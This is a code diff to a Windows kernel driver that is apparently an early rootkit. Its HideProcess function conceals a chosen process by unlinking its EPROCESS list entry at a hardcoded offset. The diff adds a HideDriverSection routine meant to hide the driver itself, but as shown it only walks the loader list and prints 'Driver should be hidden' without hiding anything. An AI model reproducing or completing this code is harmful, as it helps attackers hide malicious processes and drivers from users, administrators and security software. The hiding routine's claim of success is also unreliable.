@@ -5,7 +5,7 @@
 #include <wdf.h>
 #include <stdlib.h>
 
-#pragma warning (disable : 4100 )
+#pragma warning (disable : 4100 4201)
 
 DRIVER_INITIALIZE DriverEntry;
 
@@ -69,22 +69,81 @@ int HideProcess(int targetPID) {
         DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
     }
     PLIST_ENTRY ActiveProcessLinks;
-    ActiveProcessLinks = (PLIST_ENTRY)((unsigned char *)pidEPROCESS + 0x448);//pourquoi char*, je ne saurais peut être jamais
+    ActiveProcessLinks = (PLIST_ENTRY)((unsigned char *)pidEPROCESS + 0x448);
     ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
     ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
     ActiveProcessLinks->Flink = NULL;
     ActiveProcessLinks->Blink = NULL;
 
     //now hiding the process
-    DbgPrint("Process is now hidden...");
+    DbgPrint("Process is now hidden..."); 
     return 1;
 }
 
+
+
+
+
+
+
+
+
+
+//https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html
+typedef unsigned short WORD, * PWORD, * LPWORD;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG Flags;
+    WORD LoadCount;
+    WORD TlsIndex;
+    union
+    {
+        LIST_ENTRY HashLinks;
+        struct
+        {
+            PVOID SectionPointer;
+            ULONG CheckSum;
+        };
+    };
+    union
+    {
+        ULONG TimeDateStamp;
+        PVOID LoadedImports;
+    };
+    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
+    PVOID PatchInformation;
+    LIST_ENTRY ForwarderLinks;
+    LIST_ENTRY ServiceTagLinks;
+    LIST_ENTRY StaticLinks;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+
+int HideDriverSection(PDRIVER_OBJECT DriverObject) {
+    PVOID DriverSection = DriverObject->DriverSection;
+    PLDR_DATA_TABLE_ENTRY TableEntry  = (PLDR_DATA_TABLE_ENTRY)DriverSection;
+    DbgPrintEx(0, 0, "DriverSection: %p\n", DriverSection);
+    PLIST_ENTRY InLoadOrderLinks = (PLIST_ENTRY)((unsigned char*)TableEntry + 0);//current offset of InLoadOrderLinks
+    InLoadOrderLinks = InLoadOrderLinks->Flink;
+    PUNICODE_STRING FullDllName = (UNICODE_STRING*)((unsigned char*)InLoadOrderLinks + 0x48);
+    DbgPrintEx(0, 0, "InLoadOrderLinks FullDllName: %ls\n", FullDllName->Buffer);
+
+    DbgPrintEx(0, 0, "Driver should be hidden \n");
+    return 1;
+}
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
-    ;
-    SearchEPROCESSbyOffset(GetImageFileNameOffset("System"), "explorer.exe");
+    //SearchEPROCESSbyOffset(GetImageFileNameOffset("System"), "explorer.exe");
+    HideDriverSection(DriverObject);
     return STATUS_SUCCESS;
 }
